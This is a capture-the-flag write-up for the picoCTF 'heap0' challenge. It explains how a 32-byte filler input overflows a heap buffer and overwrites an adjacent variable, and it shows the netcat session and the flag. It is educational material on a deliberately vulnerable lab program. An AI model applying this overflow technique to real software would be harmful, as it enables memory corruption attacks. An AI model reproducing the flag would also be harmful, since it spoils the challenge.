# Description
```
Are overflows just a stack concern?
```
---
The exercise gives us addresses to `malloc`'ed bytes on the heap. We can write as many bytes as we want to the first one in memory - `input_data` - which means we can just override the metadata which is saved for the allocated chunk on the heap - then write directly to `safe_var`. The win condition described in the 4th menu option is for `safe_var != "bico"`

There's no "clever" thing to overcome here - as we can just overflow with a lot of bytes then remove what's not needed. But discussing this more deeply (without full knowledge of `malloc` implementation), I assume `malloc` allocated 8 bytes instead of 5, then it has either 8 or 16 bytes for metadata (32 vs 64 bit). Therefore, we'll make a 32 byte gibberish input to fill the gap till `safe_var` then write the needed `!bico` string:
```
❯ nc tethys.picoctf.net 60093

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5e04e574f2b0  ->   pico
+-------------+----------------+
[*]   0x5e04e574f2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!bico

...

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5e04e574f2b0  ->   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!bico
+-------------+----------------+
[*]   0x5e04e574f2d0  ->   !bico
+-------------+----------------+

...

Enter your choice: 4

YOU WIN
FLAG{}
```


# Flag
```
picoCTF{my_first_heap_overflow_1ad0e1a6}
```